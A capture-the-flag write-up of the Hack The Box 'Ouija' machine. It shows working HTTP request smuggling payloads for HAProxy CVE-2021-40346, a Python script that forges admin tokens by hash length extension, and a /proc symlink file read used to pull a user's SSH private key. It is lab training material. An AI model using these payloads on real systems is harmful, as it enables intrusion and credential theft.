**Disclaimer:** In this box I only got to the user flag because the path to root was based on reverse engineering using Ghidra, which I haven't learned yet.

# STEP 1 - Initial Enumeration
I started of with a full Nmap scan using NmapAutomator.

```bash
./nmapAutomator.sh -H <TARGET IP> -t All
```

There wasn't that much interesting information, other than the open ports and services running on the target.

## Ports and Services
|    **Service**    |     **Port**      |    **Version**    |
|-------------------|-------------------|-------------------|
|         SSH          |          22/tcp         |OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)|
|         HTTP          |         80/tcp          |Apache httpd 2.4.52|
|         HTTP          |         3000/tcp          |Node.js Express framework|


# STEP 2 - Enumerating Web Apps
I opened up the Burpsuite browser, and browsed to the target on both ports to see what I could find.

## Port 80/tcp
Browsing to `http://<TARGET>` I got an Apache2 default page:

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/ee2a2a49-1966-4304-be22-4aa768d4afb0)

Nothing interesting here. So lets use Ffuf to fuzz for directories and extensions using the following commands:

```bash
# Fuzzing extensions
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://<TARGET>/indexFUZZ -ic

# Fuzzing directories
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<TARGET>/FUZZ -ic
```

### Port 80 - Directory
```
10.10.11.244:80/
    |-- index.html <-- same apache default page
    |-- .htpasswd [403]
    |-- .htaccess.bak [403]
    |-- .htaccess [403]
    |-- server-status
```


The server-status page seems interesting - lets see what it contains:

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/5295c23b-d51a-4ffa-9a64-372baf3c968e)

According to [UltraRed](https://www.ultrared.ai/blog/apache-server-status-a-treasure-trove-for-penetration-testers):
> An Apache Server-Status page is a built-in functionality of the Apache HTTP server software that provides information about the current status of the server and its ongoing operations. It is typically accessible via a URL on the server and can provide information such as the number of requests being processed, the current state of each request, and the number of idle and busy workers.

So, basically we are seeing the requests that are made to the server. Going through the different entries, and refreshing them a few times to see how they change, I noticed two domains that are running on the server: `ouija.htb` and `gitea.ouija.htb`! Lets add them to the `/etc/hosts` file on our attack machine, and see what I get when browing to them.

## ouija.htb
Here we find a website of a Web-based Management Systems (WBMS) provider, named Ouija.

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/d266ed54-f8ee-45ae-9bf9-88ffac73aa14)

Lets look arround the website and fuzz for subdirectories to see what we find.

### ouija.htb - Directory
```
ouija.htb
    * Extensions: .html .phps
    |-- admin
    |-- contactform/
        * Directory indexing available!
        |-- contactform.js
        |-- contactform.php [404]
    |-- img
    |-- index.html
```

Nothing too interesting found so far.

## gitea.ouija.htb
Here we find a website that is using the Gitea software. 
> [Gitea](https://en.wikipedia.org/wiki/Gitea) is a forge software package for hosting software development version control using Git as well as other collaborative features like bug tracking, code review, continuous integration, kanban boards, tickets, and wikis. It supports self-hosting but also provides a free public first-party instance.

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/4342ab7e-c595-4257-9e42-1a3404774fc3)

Lets look arround the website and fuzz for subdirectories to see what we find.

### gitea.ouija.htb - Directory
```
gitea.ouija.htb
    * Extensions: none
    * Cookie: 
        i_like_gitea=e3f3f77375bcfdf9; 
        _csrf=ePDFxeOC14yTE8EA4HTGsx-QoQ86MTcwMTU5MTQyODU4Mjc3NTU3NQ
    * GET params: lang = {en-US, id-ID, ...}
    |-- api/
        |-- internal [403]
        |-- swagger/
        |-- v1/
    |-- explore/
        |-- repos/
    |-- leila
    |-- user/
        |-- events
        |-- forgot_password
        |-- login
            * GET params: redirect_to=%2f (=/)
            * POST params: _csrf, user_name, password
            |-- openid
        |-- search
        |-- sign_up
            * POST params: _csrf, user_name, email, password, retype
            * Password length is at least 8 chars
    |-- v2/ [401]
        |-- token
```

Clicking on `Explore --> Repos --> leila/ouija.htb` we seem to have a repository that contains the source code for the website hosted on the ouija.htb domain. 

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/7847e7d2-0427-4cc1-bc7b-32a2a50ae1c9)

It gives instructions on how to setup the website, which include the technologies that are used by it:
- PHP version 8.2
- Apache version 2.4.52
- HA-Proxy version 2.2.16 --> which reminds us that we saw that the requests made to the server by the domains went throught port 8080

On http://gitea.ouija.htb/api/swagger, is the Swagger API documentation, detailing all the actions that can be performed on it. Swagger is a suite of tools for RESTful API developers.

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/911123b6-0f3e-41f4-ab89-798c3b2bd248)

## Port 3000/tcp
When browsing to `http://<TARGET>:3000` we don't seem to get much:

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/84c54b9b-ec6b-4977-ae22-d4fc1c30f567)

Lets fuzz for subdirectories.

### Port 3000 - Directory

```
10.10.11.244:3000/
    |-- login/
        * Contents: {"message":"uname and upass are required"}
    |-- register/
        * Contents: {"message":"__disabled__"}
    |-- users/
        * Contents: "ihash header is missing"
```

## Subdomains & Virtual Hosts
We always remember to check for subdomains and vHosts using this Ffuf command:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://<TARGET>/ -H 'Host: FUZZ.<TARGET DOMAIN>'
```

We find many subdomains, however, all of them return a `403 ACCESS RESTRICTED` error:

```
dev                     [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 102ms]
dev2                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 80ms]
devel                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 73ms]
development             [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 73ms]
dev1                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 76ms]
develop                 [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 80ms]
dev3                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 77ms]
developer               [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 76ms]
dev01                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 73ms]
dev4                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 76ms]
developers              [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 81ms]
dev5                    [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 74ms]
devtest                 [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 77ms]
dev-www                 [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 76ms]
devil                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 74ms]
dev.m                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 83ms]
```

# STEP 3 - Searching for Known Vulnerabilities
Now we did some googling to check for known vulnerabilities for the technologies that are used by the target web app. This way we found CVE-2021-40346, an Integer Overflow vulnerability in HAProxy, that was discovered by [JFrog Security](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/). This vulnerability enables HTTP Request Smuggling (HFS), which allows an attacker to “smuggle” HTTP requests to the backend server, without the proxy server being aware of it. For further details on HRS, HAProxy's HTTP request processing phases, and the attack itself, see [this blog post](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/) by JFrog.

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/84ff7f03-a6b7-40a3-8f41-e112d300a067)

# STEP 4 - HAProxy Exploit
After (quite a lot) of trial and error and with the help of this [YouTube video](https://www.youtube.com/watch?v=RBaul29pcZs), we managed to find a request format that worked and went through. It is important that the "smuggled" request ends with a double CRLF (`/r/n/r/n`), so it is processed by the server as a valid request.

```http
POST /index.html HTTP/1.1
Host: ouija.htb
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 23

GET /admin HTTP/1.1
h:GET /index.html HTTP/1.1
Host: ouija.htb

```

**TIP:** the value of the second `Content-Length` header is the number of characters in the string `GET /admin HTTP/1.1/r/nh:`. The easiest way to get this value is by highlighting this string using the cursor in Burp's Repeater (which is used to send the request).

To determine how to use this vulnerability to our advantage, we went over the inforamtion we gathered about the target so far. This vulneraility could allow us to acces the subdomain we found that returned the 403 error. We attempted to access all the subdomain we found, but only one of them actually had content - `http://dev.ouija.htb` (a hint towards it being the only interesting one is the time duration in took for Ffuf to get a response for it, in comparison to the others).

```http
POST /index.html HTTP/1.1
Host: ouija.htb
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 37

GET http://dev.ouija.htb HTTP/1.1
h:GET /index.html HTTP/1.1
Host: ouija.htb

```

The response to the smuggled request appears in the bottom of the response to the "main" one:

```html
...SNIP...
HTTP/1.1 200 OK
date: Tue, 05 Dec 2023 09:01:13 GMT
server: Apache/2.4.52 (Ubuntu)
vary: Accept-Encoding
content-length: 670
content-type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Ouija dev</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>

    <h1>projects under development</h1>

    <ul>
        <li>
            <strong>Project Name:</strong> Api
            <br>
            <strong>Api Source Code:</strong> <a href="http://dev.ouija.htb/editor.php?file=app.js" target="_blank">app.js</a>
            <strong>Init File:</strong> <a href="http://dev.ouija.htb/editor.php?file=init.sh" target="_blank">init.sh</a>
        </li>

    </ul>

    <footer>
        &copy; 2023 ouija software
    </footer>
</body>

</html>
```

This subdomain hosts a website for Ouija Dev and contains the projects that are currently under development. One of this projects it named API, and there are references to two files that we can use the HRS vulnerability to view. 

## api.js

```javascript
var app = express();
var crt = require('crypto');
var b85 = require('base85');
var fs = require('fs');
const key = process.env.k;

app.listen(3000, ()=>{ console.log("listening @ 3000"); });

function d(b){
    s1=(Buffer.from(b, 'base64')).toString('utf-8');
    s2=(Buffer.from(s1.toLowerCase(), 'hex'));
    return s2;
}
function generate_cookies(identification){
    var sha256=crt.createHash('sha256');
    wrap = sha256.update(key);
    wrap = sha256.update(identification);
    hash=sha256.digest('hex');
    return(hash);
}
function verify_cookies(identification, rhash){
    if( ((generate_cookies(d(identification)))) === rhash){
        return 0;
    }else{return 1;}
}
function ensure_auth(q, r) {
    if(!q.headers['ihash']) {
        r.json("ihash header is missing");
    }
    else if (!q.headers['identification']) {
        r.json("identification header is missing");
    }

    if(verify_cookies(q.headers['identification'], q.headers['ihash']) != 0) {
        r.json("Invalid Token");
    }
    else if (!(d(q.headers['identification']).includes("::admin:True"))) {
        r.json("Insufficient Privileges");
    }
}

app.get("/login", (q,r,n) => {
    if(!q.query.uname || !q.query.upass){
        r.json({"message":"uname and upass are required"});
    }else{
        if(!q.query.uname || !q.query.upass){
            r.json({"message":"uname && upass are required"});
        }else{
            r.json({"message":"disabled (under dev)"});
        }
    }
});
app.get("/register", (q,r,n) => {r.json({"message":"__disabled__"});});
app.get("/users", (q,r,n) => {
    ensure_auth(q, r);
    r.json({"message":"Database unavailable"});
});
app.get("/file/get",(q,r,n) => {
    ensure_auth(q, r);
    if(!q.query.file){
        r.json({"message":"?file= i required"});
    }else{
        let file = q.query.file;
        if(file.startsWith("/") || file.includes('..') || file.includes("../")){
            r.json({"message":"Action not allowed"});
        }else{
            fs.readFile(file, 'utf8', (e,d)=>{
                if(e) {
                    r.json({"message":e});
                }else{
                    r.json({"message":d});
                }
            });
        }
    }
});
app.get("/file/upload", (q,r,n) =>{r.json({"message":"Disabled for security reasons"});});
app.get("/*", (q,r,n) => {r.json("200 not found , redirect to .");});
```

`app.js` contains the source code of a Node.js application listening on port 3000. It defines:
- **Functions:**
    - `d(b)`: decodes a base64-encoded string, converts it to UTF-8, and then decodes it again from hex.
    - `generate_cookies(identification)`: generates a SHA256 hash from a secret key and an identification parameter.
    - `verify_cookies(identification, rhash)`: checks if a given hash matches the hash generated from the provided identification. If they match, it returns 0; otherwise, it returns 1.
    - `ensure_auth(q, r)`: checks if required headers (ihash and identification) are present in the request, and verifies user privileges by checking the existence of ":admin::True" in the identification header.
- **Routes:**
    -  `/login`, `/register`, `/file/upload`: Respond with a message indicating that the functionality is disabled.
    -  `/users`: Requires authentication and responds with a message indicating that the database is unavailable.
    -  `/file/get`: Requires authentication and allows reading a file (with some security checks).
    -  `/*`: A catch-all route responding with a message indicating a 200 status (OK) and suggesting a redirect to "." (presumably the root).

## init.sh

```bash

#!/bin/bash

echo "$(date) api config starts" >>
mkdir -p .config/bin .config/local .config/share /var/log/zapi
export k=$(cat /opt/auth/api.key)
export botauth_id="bot1:bot"
export hash="4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1"
ln -s /proc .config/bin/process_informations
echo "$(date) api config done" >> /var/log/zapi/api.log

exit 1
```

`init.sh` is an initalization script that sets up an API configuration. It sets two environment variables - `k` (an api key) and `botauth_id` (credentials to be used for identification), and another environment variable that resembles an SHA265 hash. `k`, `botauth_id` are likely to be input to the `generate_cookie` function in `app.js`, and `hash` is its output. Essentially, `hash = sha256(key||botauth_id)`. We can use this in a Hash Length Extension attack to create a hash that gives us admin privileges - `sha256(key||botauth_id||::admin:True)`.

# STEP 5 - Hash Length Extension Attack
We will use [Hash_Extender](https://github.com/iagox86/hash_extender/blob/master/README.md) to generate the identification and ihash string we need. But, first we need to find the length of the secret key. To do that, we wrote the following script, which runs hash_extender with all possible lengths and sends a request to the server, until one of them works:

```python
import base64
import requests
import subprocess

'''
Input: identification string, ihash string
Process: make a request to ouija.htb:3000 with the identification and ihash headers
Output: False if the server responded with "Invalid Token", and True otherwise
'''
def req(identification, ihash):
    headers = {
        'Host': '10.10.11.244:3000',
        'ihash': ihash,
        'identification': identification
    }

    res = requests.get("http://ouija.htb:3000/users", headers=headers).text

    if "Invalid Token" not in res:
        return True
    else:
        return False
        


'''
Input: data string, append string, original hash string, and secret length
Process: runs the hash_extender tool with the given parameters, then finds the new hash string in the output
Output: new hash string
'''
def extend(data, append, original_hash, secret_length):
    res = subprocess.run(f"./hash_extender -d '{data}' -a '{append}' -f sha256 -s '{original_hash}' -l {secret_length}", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
    res_array = res.stdout.strip().split()
    result = [res_array[7], res_array[10]]
    return result


'''
Main:
'''
data = 'bot1:bot'
original_hash = '4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1'
append = '::admin:True'
secret_length = 1
found = False

while not found:
    #run hash_extender and keep the results in vars
    extender_output_arr = extend(data, append, original_hash, secret_length)
    ihash = extender_output_arr[0]
    identification = base64.b64encode(extender_output_arr[1].encode('utf-8')).decode('utf-8')

    #make the request
    found = req(identification, ihash)

    if found:
        print(f'FOUND:\nihash: {ihash}\nidentification: {identification}\nsecret lenght: {secret_length}')
    else:
        print(f'WRONG:\nihash: {ihash}\nidentification: {identification}\nsecret lenght: {secret_length}')
        secret_length += 1
```

After running the script we have the values of the `ihash` and `identification` headers that will give us admin privileges for the app running on port 3000!

```bash
┌─[✗]─[dana404@parrot]─[~/Documents/tmp/ouija/hash_extender]
└──╼ $python3 secret-length.py
WRONG:
ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b
identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDQ4M2EzYTYxNjQ2ZDY5NmUzYTU0NzI3NTY1
secret lenght: 1
WRONG:
ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b
identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA1MDNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ==
secret lenght: 2
...SNIP...
FOUND:
ihash: <VALUE>
identification: <VALUE>
secret lenght: <VALUE>
```

Now we can make request to `http://<TARGET>:3000?file=<FILENAME>` to view files on the server. We could abuse this to get Local File Inclusion (LFI), however, as can be seen in `app.js` the server doesn't allow request that contain charcters needed for Path Traversal. So we need to use another approach - in `init.sh` a symlink is created between `.config/bin/process_information` (which is in a directory accessible with the `file` parameter) to `/proc`. Interestingly, /proc/self/root is soft linked to the contents of the root directory as seen by the process. It would contain files such as `/bin`, `/etc`, and most importantly `/home`! So we tried our luck to access `.config/bin/process_informations/self/root/home/leila/user.txt` and found the user flag there!

We looked for other interesting files in the home directory, which is how we found leila's private SSH key at `.config/bin/process_informations/self/root/home/leila/.ssh/id_rsa`! This allows us to SSH to the target with the following command:

```bash
ssh -i id_rsa leila@<TARGET>
```
